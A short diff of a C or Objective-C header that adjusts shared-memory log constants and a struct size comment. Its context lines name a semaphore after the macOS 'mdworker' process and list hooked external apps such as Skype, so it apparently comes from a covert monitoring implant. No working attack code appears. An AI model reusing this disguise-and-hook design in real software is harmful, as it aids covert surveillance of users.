@@ -146,7 +146,9 @@ extern int gMemLogMaxSize;
 
 //#define SHMEM_COMMAND_MAX_SIZE  0x3000
 //#define SHMEM_LOG_MAX_SIZE      0x302460
-#define SHMEM_SEM_NAME          @"sem-mdworker"
+#define SHMEM_SEM_NAME              @"sem-mdworker"
+#define SHMEM_LOG_MAX_NUM_BLOCKS    315
+#define SHMEM_LOG_MIN_NUM_BLOCKS    50
 
 // Hooked external apps Identifier
 #define SKYPE @"com.skype.skype"
@@ -658,7 +660,7 @@ typedef struct _shMemoryCommand {
 } shMemoryCommand;
 
 //
-// size: 0x2720 - 10016
+// size: 0x271C - 10012
 // OLD!!!! size: 0x2710 - 10K
 //
 typedef struct _shMemoryLog {
